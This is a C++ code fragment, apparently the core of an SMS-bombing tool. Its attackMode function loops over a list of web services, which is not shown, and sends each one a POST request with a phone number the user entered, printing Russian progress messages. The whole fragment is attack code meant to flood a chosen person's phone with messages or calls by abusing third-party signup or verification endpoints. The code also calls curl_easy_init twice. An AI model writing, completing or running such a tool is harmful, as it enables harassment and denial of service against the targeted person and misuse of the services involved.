string enteredPhone;
string phone;

void formatPhone(int i)
{
    switch(i)
    {
        default:
            phone = enteredPhone;
            break;
    }
}

void attackMode()
{
    CURL *curl = curl_easy_init();
    CURLcode res;

    curl = curl_easy_init();
    if(curl)
    {
        cout << "Всего сервисов: " << sizeof(Services)/sizeof(Services[0]) << endl;
        for(int i=0; i<sizeof(Services)/sizeof(Services[0]); i++)
        {
            cout << "Текущий сервис: " << Services[i].name << endl;

            curl_easy_setopt(curl, CURLOPT_URL, (Services[i].url).c_str());
            formatPhone(i);
            string enteredData = Services[i].data + phone;
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, enteredData.c_str());

            res = curl_easy_perform(curl);
            if(res != CURLE_OK){cout << "curl_easy_perform() failed: " << curl_easy_strerror(res) << endl;}
            cout << endl;
        }
        
        curl_easy_cleanup(curl);
    }
}